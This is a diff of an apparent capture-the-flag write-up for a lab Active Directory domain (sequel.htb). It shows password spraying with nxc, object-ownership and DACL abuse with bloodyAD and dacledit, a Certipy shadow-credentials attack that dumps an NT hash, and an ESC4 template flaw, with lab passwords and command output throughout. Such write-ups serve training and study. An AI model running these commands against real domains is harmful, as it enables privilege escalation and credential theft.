@@ -146,6 +146,13 @@ Download `accounts.xlsx`. The file is corrupted so we need to unzip it and locat
 - `kevin@sequel.htb     // kevin        // Md9Wlq1E5bZnVDVo`
 - `sa@sequel.htb        // sa           // MSSQLP@ssw0rd!`
 
+With the possible credentials found in the excel we can type them in txts and run nxc on them:
+
+`❯ nxc smb sequel.htb -u content/users.txt -p content/passwords.txt --continue-on-success`
+```shell
+SMB         10.129.166.148  445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
+```
+
 ## RCE mssqlclient xp_cmdshell as sql_svc
 
 ```shell
@@ -166,20 +173,14 @@ SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
 SAPWD="MSSQLP@ssw0rd!"                                                                  
 ```
 
-With the possible credentials found in the excel we can type them in txts and run nxc on them:
-
-`❯ nxc smb sequel.htb -u content/users.txt -p content/passwords.txt --continue-on-success`
-```shell
-SMB         10.129.166.148  445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
-```
-
+Add the found password to `passwords.txt` and re-run `nxc` to bruteforce user/pass.
 
 ## Abusing ADCS
 
-## Bloodhound - Dump AD
+### Bloodhound - Dump AD
 We can run Bloodhound to dump all AD.
 
-### bloodyAD - Get writable objects and take ownershit of ADCS
+### bloodyAD - Get writable AD objects
 ```shell
 ❯ bloodyAD --host $ip -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 get writable
 
@@ -202,13 +203,17 @@ Let's try to modify the owner of the `ca_svc` to our ryan user.
 ❯ bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
 [+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
 ```
+- The set owner command modifies the `nTSecurityDescriptor` of the `ca_svc` object, specifically the `Owner` field, to point to `ryan`.
+- The owner of an object has implicit rights to modify the object's permissions (DACL - Discretionary Access Control List).
 
-### Dacledit - Adding FullControl to ca_svc to ryan user
+### DACLedit - Adding FullControl of ca_svc to ryan user
 ```shell
 ❯ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb/ryan:WqSZAF6CysDQbGb3'
 [*] DACL backed up to dacledit-20250308-221758.bak
 [*] DACL modified successfully!
 ```
+- This modifies the DACL of the `ca_svc` object to explicitly grant `ryan` the `FullControl` permission.
+- `FullControl` includes all possible permissions, such as reading, writing, deleting, and modifying the object.
 
 ### Certipy-AD - Dump hashes & TGT ticket for user ca_svc
 ```shell
@@ -233,7 +238,28 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
 ```
 
-Using this hash and ticket we can now take control of the ADCS and try to search for a vulnerable certificate.
+- `certipy-ad shadow auto`: We perform a "shadow credentials" attack. It abuses ADCS to add a `Key Credential` to the target user (`ca_svc`), which allows the attacker to authenticate as that user.
+
+#### What Happens During the Attack?
+1. **Generating a Certificate**:
+   - Certipy generates a certificate for the attacker. This certificate is used to authenticate as the target user (`ca_svc`).
+
+2. **Adding a Key Credential**:
+   - Certipy adds a **Key Credential** to the `ca_svc` user object in Active Directory. This is done by modifying the `msDS-KeyCredentialLink` attribute of the user.
+   - The Key Credential is essentially a public key that allows the attacker to authenticate as `ca_svc` using the corresponding private key.
+
+3. **Authenticating as `ca_svc`**:
+   - Using the certificate, Certipy authenticates as `ca_svc` and requests a Kerberos TGT (Ticket Granting Ticket) for the user.
+   - The TGT is saved to a file (`ca_svc.ccache`), which can be used later to impersonate `ca_svc`.
+
+4. **Retrieving the NT Hash**:
+   - Certipy uses the TGT to request the NT hash for `ca_svc`.
+
+5. **Restoring the Original Key Credentials**:
+   - To avoid detection, Certipy restores the original `msDS-KeyCredentialLink` attribute for `ca_svc`, removing the attacker's Key Credential.
+
+
+**Using this nt hash and ticket we can now take control of the ADCS and try to search for a vulnerable certificate.**
 
 **Let's do it:**
 
@@ -252,6 +278,8 @@ Certificate Templates
     [!] Vulnerabilities
       ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
 ```
+
+- ESC4 refers to a misconfiguration where the `Cert Publishers` group (or other low-privileged groups) has excessive permissions (e.g., `Write`, `FullControl`) on a certificate template. This allows members of the group to modify the template and potentially escalate privileges.
 
 ### Modify the vulnerable template
 ```shell
